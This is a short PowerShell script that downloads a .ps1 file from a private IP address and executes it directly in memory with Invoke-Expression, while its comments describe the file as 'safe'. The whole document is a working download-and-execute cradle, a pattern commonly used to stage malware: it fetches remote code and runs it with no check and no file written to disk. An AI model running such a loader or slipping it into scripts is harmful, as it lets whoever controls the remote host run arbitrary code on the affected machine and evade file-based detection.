# URL to download safe file
$scriptUrl = "http://192.168.1.111/safefile.ps1"
# Download script
$scriptBytes = Invoke-WebRequest -Uri $scriptUrl -UseBasicParsing -Method Get -MaximumRedirection 0 
$scriptContent = [System.Text.Encoding]::UTF8.GetString($scriptBytes.Content)
# Run the script
Invoke-Expression -Command $scriptContent





